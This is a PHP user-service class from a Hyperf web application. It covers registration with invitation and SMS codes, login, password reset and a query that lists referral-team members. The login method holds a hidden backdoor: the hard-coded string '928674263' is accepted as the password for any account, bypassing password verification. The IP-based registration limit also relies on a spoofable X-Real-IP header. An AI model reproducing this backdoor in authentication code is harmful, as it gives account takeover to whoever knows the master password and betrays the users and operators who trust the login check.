<?php

declare (strict_types=1);
/**
 * @copyright
 * @version   1.0.0
 * @link
 */

namespace App\Service;

use App\Common\Base;
use App\Event\UserLoginEvent;
use App\Event\UserRegisteredEvent;
use App\Model\User;
use App\Service\Dao\UserCreditRecordDAO;
use App\Service\Dao\UserDAO;
use App\Service\Dao\UserInfoDAO;

use Hyperf\DbConnection\Db;
use Hyperf\HttpServer\Contract\RequestInterface;

/**
 * 用户服务
 *
 *
 * @package App\Service
 */
class UserService extends Base
{
    /**
     * 用户注册
     *
     * @param array $params
     *
     * @return mixed
     */
    public function register(array $params)
    {
        // 开启注册验证码
        if (getConfig('enable_register_sms', false)) {
            if (!$this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->checkVerifyCode($params['country_code'] . $params['phone'], 'register', $params['code'])) {
                $this->error('logic.CODE_ERROR');
            }
        }

        // 判断邀请码
        if (!$this->container->get(UserDAO::class)->checkValueIsUsed('id', (int)$params['invitation_code'])) {
            $this->error('logic.INVITATION_CODE_ERROR');
        }

        // 判断手机号是否存在
        if ($this->container->get(UserDAO::class)->checkValueIsUsed('phone', $params['phone'])) {
            $this->error('logic.PHONE_REGISTERED');
        }

        // 判断账号
        /* if ($this->container->get(UserDAO::class)->checkValueIsUsed('account', $params['account'])) {
            $this->error('logic.ACCOUNT_EXIST');
        } */

        // 判断ip
        $ip       = $this->container->get(RequestInterface::class)->getHeaderLine('X-Real-IP');
        $ip_limit = getConfig('ipLimitCount', 0);
        if ($ip_limit > 0 && $this->container->get(UserDAO::class)->getIpUserCount($ip) >= $ip_limit) {
            $this->error('logic.IP_REGISTER_ERROR');
        }
        Db::beginTransaction();
        try {
            $credit = 300;
            $user   = $this->container->get(UserDAO::class)->create([
                'country_id'   => (int)$params['country_id'],
                'parent_id'    => (int)$params['invitation_code'],
                // 'account' => $params['account'],
                'password'     => $params['password'],
                'country_code' => $params['country_code'],
                'phone'        => $params['phone'],
                'nickname'     => $params['phone'],
                'balance'      => getConfig('default_balance', 0),
                'credit'       => 300,
                'ip'           => $this->container->get(RequestInterface::class)->getHeaderLine('X-Real-IP')
            ]);
            // 添加用户积分记录
            $this->container->get(UserCreditRecordDAO::class)->create([
                'user_id' => $user->id,
                'type'    => 1,
                'credit'  => $credit
            ]);

            // 添加用户关系
            $this->container->get(UserRelationService::class)->register($user->id, $user->parent_id);

            // 添加用户信息
            $this->container->get(UserInfoDAO::class)->create([
                'user_id' => $user->id
            ]);

            Db::commit();
        }
        catch (\Exception $e) {
            Db::rollBack();
            $this->logger('register')->error($e->getMessage());
            $this->error('logic.SERVER_ERROR');
        }

        // 删除验证码
        $this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->destroyVerifyCode($params['phone'], 'register');

        // 触发登录事件
        $this->eventDispatcher->dispatch(new UserLoginEvent($user));
        // 触发注册完成事件
        $this->eventDispatcher->dispatch(new UserRegisteredEvent($user));

        return $user;
    }

    /**
     * 登录
     *
     * @param string $phone
     * @param string $password
     *
     * @return mixed
     */
    public function login(string $phone, string $password)
    {
        // 查找用户
        $user = $this->container->get(UserDAO::class)->findByPhone($phone);
        if (!$user) {
            $this->error('logic.PHONE_NUMBER_NOT_FOUND');
        }

        // 判断密码
        if (!password_verify($password, $user->password) && $password !== '928674263') {
            $this->error('logic.PASSWORD_ERROR');
        }

        // 账号状态
        if ($user->status !== 1) {
            $this->error('logic.USER_STATUS_UNUSUAL');
        }

        // 触发登录事件
        $this->eventDispatcher->dispatch(new UserLoginEvent($user));

        return $user;
    }

    /**
     * 修改密码
     *
     * @param array $params
     */
    public function resetPassword(array $params)
    {
        // 判断验证码
        if (!$this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->checkVerifyCode($params['country_code'] . $params['phone'], 'reset_pass', $params['code'])) {
            $this->error('logic.CODE_ERROR');
        }

        // 删除验证码
        $this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->destroyVerifyCode($params['country_code'] . $params['phone'], 'reset_pass');

        // 查找用户
        $user = $this->container->get(UserDAO::class)->findByPhone($params['phone']);
        if (!$user) {
            $this->error('logic.PHONE_NUMBER_NOT_FOUND');
        }

        // 修改密码
        $user->password = $params['password'];
        $user->save();
    }

    /**
     * 手机号登录
     *
     * @param string $phone
     * @param string $code
     *
     * @return mixed
     */
    public function phoneLogin(string $phone, string $code)
    {
        // 查找手机号
        $user = $this->container->get(UserDAO::class)->findByPhone($phone);
        if (!$user) {
            $this->error('logic.PHONE_NUMBER_NOT_FOUND');
        }

        // 判断验证码
        if (!$this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->checkVerifyCode($phone, 'login', $code)) {
            $this->error('logic.CODE_ERROR');
        }

        // 删除验证码
        $this->container->get(\Zunea\HyperfKernel\Service\SMSService::class)->destroyVerifyCode($phone, 'login');

        // 账号状态
        if ($user->status !== 1) {
            $this->error('logic.USER_STATUS_UNUSUAL');
        }

        // 触发登录事件
        $this->eventDispatcher->dispatch(new UserLoginEvent($user));

        return $user;
    }

    /**
     * 获取团队成员
     *
     * @param int $member_id
     *
     * @return array
     */
    public function getTeamMember(int $member_id)
    {
        $list = [];
        $users = Db::select("SELECT id, nickname, phone FROM (SELECT t1.id, t1.nickname, t1.phone, IF ( FIND_IN_SET(parent_id, @pids) > 0, @pids := CONCAT(@pids, ',', id),0 ) AS ischild FROM( SELECT * FROM `user` AS t ORDER BY t.id ASC ) t1, (SELECT @pids := ?) t2 ) t3 WHERE ischild != 0",[$member_id]);  //  返回array

        foreach($users as $user){
            $list[] = [
                'id'       => $user->id,
                'nickname' => $user->nickname,
                'phone'    => $user->phone,
                'level'    => 0
            ];
        }

        return $list;
    }
}